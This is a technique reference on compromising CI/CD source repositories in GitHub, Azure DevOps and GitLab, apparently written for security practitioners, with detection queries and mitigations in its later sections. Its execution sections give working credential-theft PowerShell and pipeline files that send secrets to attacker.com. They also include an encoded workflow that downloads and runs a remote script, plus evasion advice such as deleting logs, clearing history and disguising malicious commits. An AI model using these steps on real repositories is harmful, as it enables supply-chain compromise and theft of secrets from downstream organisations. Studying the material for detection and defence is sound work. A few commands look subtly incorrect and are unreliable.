# [SUPPLY-CHAIN-001]: Pipeline Repository Compromise

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | SUPPLY-CHAIN-001 |
| **MITRE ATT&CK v18.1** | [Compromise Software Dependencies and Development Tools (T1195.001)](https://attack.mitre.org/techniques/T1195/001/) |
| **Tactic** | Resource Development / Initial Access |
| **Platforms** | Entra ID / DevOps (Azure DevOps, GitHub) |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | GitHub Actions (all versions), Azure DevOps (all versions), GitLab (all versions) |
| **Patched In** | N/A - architectural vulnerability, not patch-dependent |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

- **Concept:** Pipeline repository compromise occurs when attackers gain unauthorized write access to a software development pipeline repository (GitHub, Azure DevOps, GitLab) and inject malicious code directly into the codebase, build configuration, or deployment workflows. This allows them to compromise the software build process itself, affecting all downstream consumers of the affected software. The attack leverages the trust relationship between developers and source control systems to distribute malicious code at scale.

- **Attack Surface:** GitHub repositories, Azure DevOps repositories, GitLab repositories, GitHub Actions workflows, Azure Pipelines YAML files, CI/CD configuration files, branch protection settings, webhook configurations.

- **Business Impact:** **Complete supply chain compromise of affected software products.** All downstream organizations that pull from or depend on the compromised repository become vulnerable to execution of malicious code during their own build/deployment processes. This can affect hundreds or thousands of downstream customers simultaneously, enabling mass data exfiltration, ransomware deployment, or persistent backdoor installation.

- **Technical Context:** Repository compromise typically takes 10 minutes to several hours to execute once an attacker has credentials. Detection likelihood is low if branch protection rules are misconfigured or monitoring is absent. Common indicators include unexpected commits, new workflow files, changes to trusted branches, and unusual activity from service accounts or external IP addresses.

### Operational Risk

- **Execution Risk:** High - Requires valid credentials or bypass of branch protection rules, but once achieved, impact is guaranteed and affects all downstream users.
- **Stealth:** Medium - Malicious commits can be obfuscated, workflows can be hidden in non-default branches, and logs can be deleted post-execution. However, code changes are visible in commit history if not force-pushed.
- **Reversibility:** Partial - Code can be reverted via git reset, but if malicious artifacts were already published, downstream impact is difficult to contain.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS v1.4.0 – SCM-2.2 | Source code management requires branch protection, code review, and audit logging for all changes. |
| **DISA STIG** | AC-2(a) – Account Management | Access to software repositories must be restricted to authorized personnel with MFA and regular credential rotation. |
| **CISA SCuBA** | SCUBA-GH-A1-01 | GitHub organizations must enforce MFA for all members and restrict action execution to approved workflows. |
| **NIST 800-53** | SI-7 – Software, Firmware, and Information Integrity | Implement integrity controls for software development and deployment tools. |
| **GDPR** | Art. 32 – Security of Processing | Technical and organizational measures must protect the integrity of processing systems, including development pipelines. |
| **DORA** | Art. 9 – Protection and Prevention | Financial entities must establish controls to detect and prevent ICT threats to development infrastructure. |
| **NIS2** | Art. 21 – Cyber Risk Management Measures | Critical infrastructure operators must secure development and CI/CD pipelines against unauthorized access. |
| **ISO 27001** | A.8.3.4 – Password Management | Source control access credentials must be managed securely and rotated regularly. |
| **ISO 27005** | Risk Scenario: Compromise of Source Code Repository | Assess risks of unauthorized modification or injection of malicious code into development repositories. |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Developer or higher on repository, or admin-level access to Entra ID / organization (for account takeover). Service account credentials with write access. PAT (Personal Access Token) or OAuth application tokens with `repo` or `admin:repo_hook` scope.

- **Required Access:** Network access to GitHub/Azure DevOps/GitLab APIs. Valid authentication credentials (username/password, PAT, SSH key, OAuth token, service principal credentials). Access to repository settings (to modify branch protection, webhooks, or deployment keys).

**Supported Versions:**
- **GitHub:** All versions (GitHub.com, GitHub Enterprise Server 3.0+)
- **Azure DevOps:** All versions (Azure DevOps Services, Azure DevOps Server 2019+)
- **GitLab:** All versions (GitLab.com, GitLab self-managed 13.0+)
- **PowerShell:** Version 5.0+ (for credential theft and token exfiltration)
- **Azure CLI:** Version 2.0+ (for Entra ID and Azure DevOps interaction)

- **Tools:**
    - [GitHub CLI (gh)](https://github.com/cli/cli) (Version 2.0+)
    - [Azure CLI](https://github.com/Azure/azure-cli) (Version 2.0+)
    - [Git](https://git-scm.com/) (Version 2.30+)
    - [jq](https://stedolan.github.io/jq/) (JSON query tool, all versions)
    - [curl](https://curl.se/) (all versions)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### Entra ID / Azure DevOps Reconnaissance

**Check for service accounts with high-privilege access:**
```powershell
# List service connections in Azure DevOps with exposed credentials
az devops service-endpoint list --organization "https://dev.azure.com/{org}" --project "{project}" --query "[?type=='GitHub' || type=='GitHubEnterpriseServer'].{name: name, url: url, authorization: authorization}"

# Check for personal access tokens in Entra ID
az ad app credential list --id "{app-id}" --query "[].{displayName: displayName, startDate: startDate}"

# Enumerate GitHub organization members and permissions
gh api orgs/{org}/members --paginate --query '.[].login'
gh api orgs/{org}/teams --paginate --query '.[].name'
```

**What to Look For:**
- Service accounts with `Owner` or `Admin` roles in GitHub/Azure DevOps organizations
- Long-lived Personal Access Tokens (PATs) without expiration dates
- Service principals with high-privilege scopes (e.g., `repo:admin`, `workflow`)
- OAuth applications with `admin:repo_hook` or `repo` permissions granted by non-admin users

**Version Note:** GitHub token enumeration commands work identically across all GitHub versions (Enterprise and Cloud). Azure DevOps queries may differ slightly between Azure DevOps Services and Server versions.

#### Linux/Bash / Azure CLI Reconnaissance

```bash
# List all PATs in an Azure DevOps organization (requires admin)
az devops security permission list --id 26338d40-e3cd-40e2-90a5-37eb4f00a4e1 --recurse true --detect --organization "https://dev.azure.com/{org}" 

# Check GitHub repository branch protection rules
curl -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/{owner}/{repo}/branches/{branch}/protection" | jq '.required_pull_request_reviews'

# List all GitHub deployments and deployment keys (potential backdoors)
gh api repos/{owner}/{repo}/deployments --paginate --query '.[].{id: id, creator: creator, status_state: status_state}'
```

**What to Look For:**
- Deployment keys without owner attribution (orphaned keys are potential backdoors)
- Branch protection rules that can be bypassed (dismiss stale reviews enabled, required reviewers count = 0)
- GitHub Actions workflows without approval gates (`pull_request_target` triggers without code review)

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Credential Theft via Compromised Developer Account (Phishing/Malware)

**Supported Versions:** GitHub (all versions), Azure DevOps (all versions), GitLab (all versions)

#### Step 1: Obtain Valid Repository Credentials

**Objective:** Acquire GitHub PAT, Azure DevOps PAT, or SSH key through phishing, malware, or open-source leak.

**Command (Credential Theft via Malware):**
```powershell
# Exfiltrate GitHub PAT from environment variables or config files
$githubToken = $env:GITHUB_TOKEN
if (-not $githubToken) {
    $githubToken = Get-Content "~\.github\credentials" -ErrorAction SilentlyContinue
}

# Exfiltrate Azure DevOps PAT
$azureToken = $env:SYSTEM_ACCESSTOKEN  # Set in Azure Pipelines jobs
if (-not $azureToken) {
    $azureToken = Get-Content "~\.azure\tokens" -ErrorAction SilentlyContinue
}

# Exfiltrate SSH keys for Git authentication
$sshKeys = Get-ChildItem "~\.ssh\" -Filter "id_*" -Exclude "*.pub" | Select-Object -ExpandProperty FullName

# Exfiltrate git config credentials
git config --global --get-all credential.helper | Write-Output
```

**Expected Output:**
```
ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
C:\Users\attacker\.ssh\id_ed25519
C:\Users\attacker\.ssh\id_rsa
```

**What This Means:**
- `ghp_*` prefix indicates a valid GitHub Personal Access Token
- Azure DevOps tokens are 52-character alphanumeric strings
- SSH keys (id_rsa, id_ed25519) can be used for git authentication without additional credentials
- git credential helper may store plaintext credentials in config

**OpSec & Evasion:**
- Use malware that runs in-memory to avoid disk artifacts
- Exfiltrate credentials to attacker-controlled webhook endpoints, not C2 infrastructure
- Clear PowerShell history: `Remove-Item (Get-PSReadlineOption).HistorySavePath`
- Detection likelihood: **Medium** - Modern EDR can detect credential access from process memory

**Troubleshooting:**
- **Error:** "GitHub token not found in environment"
  - **Cause:** Token may be stored in browser cache, credentials manager, or IDE config
  - **Fix:** Check `~\.ssh\config`, IDE settings (VS Code, JetBrains), and browser developer tools

#### Step 2: Authenticate to Repository and Enumerate Branch Protection

**Objective:** Validate stolen credentials and identify branch protection bypass opportunities.

**Command (GitHub):**
```bash
# Test GitHub PAT authentication
curl -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/user" | jq '.login, .id'

# List repository branch protection rules (requires `repo` or `admin:repo_hook` scope)
curl -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/{owner}/{repo}/branches/main/protection" | jq '.'

# Check if pull request reviews can be dismissed
curl -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/{owner}/{repo}/branches/main/protection/required_pull_request_reviews" \
  | jq '.dismiss_stale_reviews'
```

**Expected Output (Vulnerable Config):**
```json
{
  "required_pull_request_reviews": {
    "dismissal_restrictions": {
      "users": [],
      "teams": []
    },
    "dismiss_stale_reviews": true,
    "require_code_owner_reviews": false,
    "required_approving_review_count": 1
  },
  "enforce_admins": false
}
```

**What This Means:**
- `enforce_admins: false` allows repository admins to bypass branch protection (administrator override)
- `required_approving_review_count: 1` means only 1 approval is needed (low threshold)
- `dismiss_stale_reviews: true` allows dismissal of previous reviews before new commits
- `require_code_owner_reviews: false` allows PRs without codeowner approval

**Command (Azure DevOps):**
```bash
# List Azure DevOps repository policies
az repos policy list --organization "https://dev.azure.com/{org}" --project "{project}" --repository-id "{repo-id}" --detect

# Check if require reviewer policy is enforced
az repos policy approver-count list --organization "https://dev.azure.com/{org}" --project "{project}" --repository-id "{repo-id}"
```

**OpSec & Evasion:**
- API calls are logged in audit logs but can be obfuscated with high-volume scanning
- Detection likelihood: **Low** - if performed during business hours with legitimate user account

#### Step 3: Create Malicious Commit and Push to Protected Branch

**Objective:** Inject malicious code into main/master branch, bypassing branch protection if possible.

**Command (Bypass Stale Review Dismissal):**
```bash
# Clone repository
git clone https://github.com/{owner}/{repo}.git
cd {repo}

# Configure git with attacker identity
git config user.name "Legitimate Developer"
git config user.email "dev@company.com"

# Create malicious code change (e.g., CI/CD credential exfiltration)
cat >> ".github/workflows/exfil-secrets.yml" << 'EOF'
name: Exfiltrate Secrets
on: [push, pull_request]
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - name: Dump Secrets
        run: |
          echo "Exfiltrating credentials..."
          env | grep -E "TOKEN|SECRET|KEY|PASSWORD" | base64 -w0 | \
          curl -d @- https://attacker.com/webhook
EOF

# Commit malicious change
git add .github/workflows/exfil-secrets.yml
git commit -m "Fix: Add security scanning workflow"

# Bypass branch protection by creating PR, waiting for CI to pass, then force-pushing
# (Only works if enforce_admins=false and attacker is repo admin)
git push --force origin main
```

**Expected Output (Success):**
```
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
...
 + [force update] main -> main (forced update)
```

**What This Means:**
- Force push succeeded (branch protection was either absent or admin override was used)
- Malicious workflow is now part of main branch and will execute on every push/PR
- All downstream repositories that pull this code will inherit the malicious workflow

**Command (Alternative: Merge Stale PR):**
```bash
# If require_code_owner_reviews=false, attacker can:
# 1. Create PR with malicious code
# 2. Wait for legitimate approval
# 3. Dismiss stale reviews (if enabled)
# 4. Make new innocuous changes to reset review counter
# 5. Merge without new approval

# Create feature branch
git checkout -b feature/add-security-policy
# ... make malicious commit ...
git push origin feature/add-security-policy

# Open PR via GitHub Web UI or:
gh pr create --base main --head feature/add-security-policy --title "Add security scanning" --body "Standard security improvement"
```

**OpSec & Evasion:**
- Use innocuous commit messages ("Fix typo", "Update dependencies", "Security patch")
- Embed malicious code in legitimate-looking workflows (add security scanning, linting, tests)
- Hide exfiltration in error logs: `echo "Build failed: $SECRETS" > error.log`
- Force push from attacker IP if possible (less suspicious than internal IP)
- Detection likelihood: **Medium-High** - Code review by human or SAST tool would catch malicious intent

**Troubleshooting:**
- **Error:** "failed to push some refs to remote"
  - **Cause:** Branch protection prevents force push
  - **Fix:** If not admin, must go through PR process; if admin, ensure `enforce_admins=false`

#### Step 4: Trigger Workflow and Exfiltrate Credentials

**Objective:** Ensure malicious workflow executes and sensitive data is exfiltrated to attacker infrastructure.

**Command (Manual Trigger):**
```bash
# Trigger workflow run manually (requires workflow_dispatch event)
gh workflow run exfil-secrets.yml --repo {owner}/{repo}

# Monitor workflow execution in real-time
gh run watch --repo {owner}/{repo} --exit-status

# Retrieve workflow logs (including exfiltrated data)
gh run view {run-id} --repo {owner}/{repo} --log
```

**Expected Output (Exfiltrated Secrets):**
```
Exfiltrating credentials...
GITHUB_TOKEN=ghu_xxxxxxxxxxxxx
NPM_TOKEN=npm_xxxxxxxxxxxxx
DOCKER_PASSWORD=xxxxxxxxxxxxx
AWS_ACCESS_KEY_ID=AKIAxxxxxxxxxxxxx
```

**What This Means:**
- Secrets are logged in plaintext in workflow execution logs
- Attacker can download full logs containing all environment variables
- Credentials are valid and can be used to push malicious packages, deploy infrastructure, etc.

**Command (Automatic Trigger on Push):**
```bash
# Malicious workflow runs automatically on every push
git commit --allow-empty -m "Trigger workflow"
git push origin main

# Workflow executes and exfiltrates secrets to attacker webhook
# Attacker can monitor webhook for incoming secrets in real-time
```

**OpSec & Evasion:**
- Encode exfiltrated data (base64) to bypass simple log scanning
- Use curl with `-s` flag to suppress output
- Delete workflow logs after exfiltration (if admin): `gh run delete {run-id}`
- Detection likelihood: **High** - GitHub logs all environment variables and API calls

---

### METHOD 2: Compromise via OAuth Application Token Abuse (Zero-Click)

**Supported Versions:** GitHub (3.0+), GitHub Enterprise Server (3.0+), Azure DevOps (all)

#### Step 1: Enumerate OAuth Applications with High Privileges

**Objective:** Identify OAuth applications granted broad permissions (e.g., `repo:admin`, `workflow`) by legitimate users.

**Command (GitHub):**
```bash
# Enumerate OAuth applications (visible to any user)
gh auth status --show-token  # Shows current token scope

# Enumerate organization OAuth apps (requires admin in organization)
curl -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/orgs/{org}/installations" | jq '.[].{id: id, app_id: app_id, account: account}'

# Check app permissions
curl -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/app/installations/{installation_id}/access_tokens" \
  -X POST \
  -d '{"permissions": {"contents": "read", "workflows": "write"}}' | jq '.token'
```

**What to Look For:**
- OAuth applications with `admin:repo_hook`, `repo:admin`, `workflow` permissions
- Applications from third-party integrations (CI/CD tools, security scanners) that users didn't authorize
- Applications that grant `write` access to workflows (can inject malicious jobs)

#### Step 2: Pivot to Repository Write Access

**Objective:** Use leaked OAuth token to create malicious PR or commit.

**Command:**
```bash
# Using stolen OAuth app token, create malicious commit on protected branch
curl -X POST \
  -H "Authorization: token $OAUTH_APP_TOKEN" \
  -H "Accept: application/vnd.github.v3+json" \
  "https://api.github.com/repos/{owner}/{repo}/contents/.github/workflows/steal-secrets.yml" \
  -d '{
    "message": "Add workflow",
    "content": "bmFtZTogU3RlYWwgU2VjcmV0cwpvbjogW3B1c2hdCmpvYnM6CiAgc3RlYWw6CiAgICBydW5zLW9uOiB1YnVudHUtbGF0ZXN0CiAgICBzdGVwczoKICAgICAgLSBydW46IHdnZXQgaHR0cHM6Ly9hdHRhY2tlci5jb20vc3RlYWwuc2ggfCBiYXNo",
    "branch": "main"
  }'
```

**OpSec & Evasion:**
- OAuth app tokens are harder to detect than PATs (less distinctive prefix)
- Logs will show legitimate app name instead of attacker's name
- Detection likelihood: **Medium** - Authorization logs show the app, not the token holder

---

### METHOD 3: Compromise via Compromised Entra ID Service Principal

**Supported Versions:** Azure DevOps (all), GitHub Enterprise with OIDC federation

#### Step 1: Obtain Service Principal Credentials (via Azure Key Vault leak or CI/CD logs)

**Objective:** Extract service principal credentials used by automation, stored in Azure Key Vault or CI logs.

**Command (Azure DevOps Credential Leak):**
```powershell
# Service principal credentials are often hardcoded in Azure Pipelines
# Example: Service connection stores credentials in System.AccessToken

# Access exposed service principal credentials from build logs
# (if logging is not properly sanitized)
$servicePrincipalToken = $env:SYSTEM_ACCESSTOKEN

# Create access token using service principal client ID and secret
$clientId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
$clientSecret = "xxx~xxxxxxxxx-xxxxxxxxxxxxxxxxxxxx"
$tenantId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"

# Authenticate to Azure
$body = @{
    grant_type    = "client_credentials"
    client_id     = $clientId
    client_secret = $clientSecret
    resource      = "https://dev.azure.com"
} | ConvertTo-Json

$response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantId/oauth2/token" `
    -Method POST -ContentType "application/json" -Body $body

$azureToken = $response.access_token
```

**Expected Output:**
```
access_token : eyJhbGc... [truncated JWT token]
```

**What This Means:**
- Service principal is authenticated to Azure DevOps and can perform any action allowed by its role
- Token is valid for 1 hour and can be used for API calls

#### Step 2: Modify Azure DevOps Repository Settings

**Objective:** Inject malicious code into Azure DevOps pipeline YAML or create backdoor pipeline.

**Command:**
```powershell
# Using service principal token, update Azure Pipelines YAML to exfiltrate secrets
$azureDevOpsOrg = "https://dev.azure.com/{org}"
$project = "{project}"
$repoId = "{repo-id}"
$filePath = "azure-pipelines.yml"

$maliciousYAML = @'
trigger:
  - main

pool:
  vmImage: 'ubuntu-latest'

steps:
- script: |
    env | grep -E "TOKEN|SECRET|KEY" | curl -d @- https://attacker.com/webhook
  displayName: 'Build'
'@

# Update pipeline file
$updateUri = "$azureDevOpsOrg/$project/_apis/git/repositories/$repoId/pushes?api-version=7.0"

$headers = @{
    Authorization = "Bearer $azureToken"
    "Content-Type" = "application/json"
}

$pushPayload = @{
    refUpdates = @(
        @{
            name        = "refs/heads/main"
            oldObjectId = "0000000000000000000000000000000000000000"
            newObjectId = (git rev-parse HEAD)
        }
    )
    commits = @(
        @{
            comment = "Update pipeline"
            changes = @(
                @{
                    changeType = 2  # Add
                    item       = @{ path = $filePath }
                    newContent = @{ content = $maliciousYAML; contentType = 2 }  # Plain text
                }
            )
        }
    )
} | ConvertTo-Json -Depth 10

Invoke-RestMethod -Uri $updateUri -Method POST -Headers $headers -Body $pushPayload
```

**OpSec & Evasion:**
- Service principal tokens are logged in audit logs but difficult to trace to actual attacker
- Azure Pipelines logs all environment variables, but exfiltration can be encoded
- Detection likelihood: **High** - Unusual service principal activity is logged in Azure AD audit logs

---

## 5. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

**Note:** No official Atomic Red Team test exists for repository compromise (not applicable to Windows endpoints). The following represents a red team exercise framework:

### Manual Red Team Exercise

- **Exercise Name:** "Repository Compromise Simulation"
- **Scope:** Non-production Azure DevOps organization or GitHub organization fork
- **Duration:** 30-60 minutes
- **Participants:** Security team, development team (optional observers)

**Execution Steps:**
1. Stand up isolated dev environment with test repository
2. Create service account with developer permissions
3. Simulate credential theft (distribute leaked PAT)
4. Inject malicious workflow via compromised account
5. Monitor detection tools for alerting
6. Measure time-to-detection (TTD)
7. Remediate via credential revocation and branch reset

---

## 6. TOOLS & COMMANDS REFERENCE

#### [GitHub CLI (gh)](https://github.com/cli/cli)

**Version:** 2.0+  
**Minimum Version:** 2.0  
**Supported Platforms:** Windows, macOS, Linux

**Installation:**
```bash
# macOS
brew install gh

# Windows (via Chocolatey)
choco install gh

# Linux (via package manager)
sudo apt-get install gh

# Verify installation
gh --version
```

**Usage Examples:**
```bash
# Authenticate to GitHub
gh auth login

# Create a pull request
gh pr create --base main --head feature-branch --title "Add feature"

# Enumerate repository collaborators
gh repo view {owner}/{repo} --json collaborators --template '{{.collaborators}}' --jq '.[] | .login'

# List all workflows in repository
gh workflow list --repo {owner}/{repo}

# Trigger a workflow
gh workflow run {workflow-name} --repo {owner}/{repo}

# View workflow run logs
gh run view {run-id} --repo {owner}/{repo} --log
```

#### [Azure CLI](https://github.com/Azure/azure-cli)

**Version:** 2.0+  
**Minimum Version:** 2.0  
**Supported Platforms:** Windows, macOS, Linux

**Installation:**
```bash
# macOS
brew install azure-cli

# Windows
msiexec /i AzureCLI.msi

# Linux
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```

**Usage Examples:**
```bash
# Authenticate
az login

# List service connections
az devops service-endpoint list --organization "https://dev.azure.com/{org}" --project "{project}"

# Update repository policy
az repos policy create --organization "https://dev.azure.com/{org}" --project "{project}" --repository-id "{repo-id}"

# Create service principal
az ad sp create-for-rbac --name "BuildAutomation" --role "Contributor"
```

#### [git](https://git-scm.com/)

**Version:** 2.30+

**Critical Commands:**
```bash
# Clone repository
git clone https://github.com/{owner}/{repo}.git

# Create and push branch
git checkout -b malicious-branch
git commit --allow-empty -m "Trigger CI/CD"
git push -u origin malicious-branch

# Force push (if allowed by branch protection)
git push --force origin main

# Revert commits (post-compromise cleanup)
git revert HEAD~5..HEAD
git push origin main
```

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect Unauthorized Repository Pushes (GitHub)

**Rule Configuration:**
- **Required Table:** AuditLogs (if GitHub Enterprise is logged) or custom log table for GitHub webhook events
- **Required Fields:** PushEvent, actor, ref, repository
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** GitHub Enterprise Server 3.0+, GitHub Actions workflows

**KQL Query:**
```kusto
// Detect suspicious pushes to main/master branch outside normal hours
GithubAuditLog
| where TimeGenerated > ago(5m)
| where event == "push"
| where action == "repo.push" or action == "push"
| where ref == "refs/heads/main" or ref == "refs/heads/master"
| extend actor = tostring(actor)
| extend payload = parse_json(payload)
| where hourofday(TimeGenerated) < 6 or hourofday(TimeGenerated) > 22  // Outside business hours
| where actor !in ('github-actions[bot]', 'dependabot[bot]')  // Exclude bots
| project TimeGenerated, actor, repository, ref, commit_count = toint(payload.push.size), action
| where commit_count > 0
| summarize PushCount = count() by actor, repository
| where PushCount > 3  // Multiple pushes in short window
```

**What This Detects:**
- Unusual push activity to protected branches during off-hours
- Pushes from non-bot service accounts
- Multiple pushes in a short timeframe (potential code injection)

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious Repository Push to Main Branch`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Set entity mapping: actor → Account.Name, repository → CloudApplication.Name
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "your-rg"
$WorkspaceName = "your-sentinel-workspace"

# Note: Requires Azure Sentinel resource provider registration
$ruleContent = @{
    displayName = "Suspicious Repository Push to Main Branch"
    description = "Detects unauthorized or unusual pushes to main branch"
    severity    = "High"
    enabled     = $true
    query       = (Get-Content -Path "kql-query.kql" -Raw)
    frequency   = "PT5M"
    period      = "PT1H"
}
```

**Source:** [GitHub Audit Log API Documentation](https://docs.github.com/en/enterprise-server@3.4/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/about-the-audit-log-for-your-enterprise)

#### Query 2: Detect Azure Pipelines Credential Exfiltration

**Rule Configuration:**
- **Required Table:** AzureActivity, AzureDiagnostics
- **Required Fields:** OperationName, OperationNameValue, Caller, Resource
- **Alert Severity:** Critical
- **Frequency:** Run every 1 minute
- **Applies To Versions:** Azure DevOps Services (all versions)

**KQL Query:**
```kusto
// Detect Azure Pipelines jobs that access environment variables (credential theft pattern)
AzureActivity
| where TimeGenerated > ago(1m)
| where OperationNameValue in ('Microsoft.Build/builds/write', 'Microsoft.VisualStudio/pipelines/read', 'Microsoft.VisualStudio/pipelines/execute')
| where ActivityStatusValue == "Success" or ActivityStatusValue == "Started"
| extend Properties = parse_json(tostring(Properties))
| extend JobName = tostring(Properties.jobName), BuildId = tostring(Properties.buildId)
| where JobName has_any ('secret', 'cred', 'token', 'key', 'password', 'exfil', 'dump')  // Suspicious keywords
| project TimeGenerated, Caller, OperationNameValue, JobName, BuildId, ActivityStatusValue
| summarize ExfiltrationAttempts = count() by Caller, JobName
| where ExfiltrationAttempts > 1
```

**What This Detects:**
- Pipeline jobs with names indicating credential access or exfiltration
- Multiple execution attempts of credential-related jobs
- Unusual caller patterns in build definitions

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Azure Pipelines Credential Exfiltration Attempt`
   - Severity: `Critical`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `1 minute`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Set entity mapping: Caller → Account.Name, BuildId → Process.Name
7. Click **Review + create**

---

## 8. WINDOWS EVENT LOG MONITORING

**Note:** Repository compromise is a cloud-based attack and does not generate Windows Event Log entries. However, if a CI/CD agent is running on Windows, the following events may indicate compromise:

**Event ID: 4688 (Process Creation)**
- **Log Source:** Security
- **Trigger:** Processes spawned by GitHub Actions Runner or Azure Pipelines Agent that access credential stores
- **Filter:** `Image contains 'curl' AND CommandLine contains '-d @-' AND CommandLine contains 'webhook'`
- **Applies To Versions:** Windows Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Process Creation** → **Audit Process Creation**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on CI/CD agent machines

**Event ID: 4690 (Registry Object Access)**
- **Log Source:** Security
- **Trigger:** Access to HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings (proxy credentials)
- **Filter:** `ObjectName contains 'Internet Settings'`

---

## 9. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

* **Enforce Multi-Factor Authentication (MFA) on all developer accounts:**
    **GitHub:** Requires Security Key or authenticator app for all members
    **Azure DevOps:** Enable MFA via Entra ID Conditional Access
    
    **Manual Steps (GitHub):**
    1. Go to **GitHub Organization Settings** → **Security** → **Authentication**
    2. Toggle **Require two-factor authentication for all members in this organization**
    3. Select enforcement level: **Require members to enable two-factor authentication**
    4. Grace period: **0 days** (immediate enforcement)
    5. Click **Update**
    
    **Manual Steps (Azure DevOps):**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Enforce MFA for Azure DevOps`
    4. **Assignments:**
       - Users: **All users** (or specific DevOps group)
       - Cloud apps: **Azure DevOps (Enterprise)**
    5. **Access controls:**
       - Grant: **Require multi-factor authentication**
    6. Enable policy: **On**
    7. Click **Create**

    **Validation Command:**
    ```bash
    # GitHub: Verify MFA is required
    curl -H "Authorization: token $GITHUB_TOKEN" \
      "https://api.github.com/orgs/{org}/members" | jq '.[].two_factor_authentication_enabled'
    
    # Azure DevOps: Verify Conditional Access policy exists
    az ad conditional-access policy list --query "[?contains(displayName, 'Azure DevOps')]" -o table
    ```

* **Implement branch protection rules with mandatory code review:**
    
    **Manual Steps (GitHub):**
    1. Go to **Repository** → **Settings** → **Branches**
    2. Under **Branch protection rules**, click **Add rule**
    3. Branch name pattern: `main` or `master`
    4. Enable:
       - **Require a pull request before merging**: ✓
       - **Require approvals**: ✓ (minimum 2)
       - **Dismiss stale pull request approvals when new commits are pushed**: ✓
       - **Require review from code owners**: ✓
       - **Require status checks to pass before merging**: ✓
       - **Require branches to be up to date before merging**: ✓
       - **Require code owner reviews**: ✓
       - **Restrict who can dismiss pull request reviews**: ✓ (set to repo admins only)
       - **Enforce all the above restrictions for administrators**: ✓
    5. Click **Create**
    
    **Manual Steps (Azure DevOps):**
    1. Go to **Project Settings** → **Repositories** → Select repository
    2. Navigate to **Policies** → **Branch Policies**
    3. For `main` branch, enable:
       - **Require a minimum number of reviewers**: 2
       - **Check for linked work items**: ✓
       - **Check for comment resolution**: ✓
       - **Enforce a git-based workflow**: ✓

* **Implement Secret Detection in CI/CD pipelines:**
    
    **GitHub Action Secret Scanner:**
    ```yaml
    name: Secret Scanning
    on: [push, pull_request]
    jobs:
      secret-scan:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v3
          - name: TruffleHog Secret Detection
            run: |
              pip install truffleHog
              truffleHog filesystem . --json > secrets.json
              if [ -s secrets.json ]; then
                echo "Secrets detected!"
                cat secrets.json
                exit 1
              fi
    ```
    
    **Azure Pipelines Secret Scanning:**
    ```yaml
    trigger:
      - main
    
    pool:
      vmImage: 'ubuntu-latest'
    
    steps:
    - script: |
        pip install truffleHog detect-secrets
        truffleHog filesystem . --json > /tmp/secrets.json
        if [ -s /tmp/secrets.json ]; then
          echo "##vso[task.logissue type=error]Secrets detected in repository"
          exit 1
        fi
      displayName: 'Scan for Secrets'
    ```

#### Priority 2: HIGH

* **Rotate Personal Access Tokens (PATs) regularly:**
    
    **GitHub:**
    - Set PAT expiration: Maximum 90 days
    - Scope: Minimize permissions (e.g., `repo` only, not `admin:repo_hook`)
    - Command to list PATs:
    ```bash
    curl -H "Authorization: token $GITHUB_TOKEN" \
      "https://api.github.com/user/installations" | jq '.installations[].access_tokens_url'
    ```
    
    **Azure DevOps:**
    ```bash
    # List and rotate PATs
    az devops service-endpoint list --organization "https://dev.azure.com/{org}" \
      --query "[?type=='GitHub'].authentication.parameters.accessToken" --output table
    ```
    
    **Manual Steps (GitHub Web UI):**
    1. Go to **Personal Settings** → **Developer settings** → **Personal access tokens** → **Tokens (classic)**
    2. For each token: Click **Regenerate token** or **Delete**
    3. Set expiration to **90 days maximum**

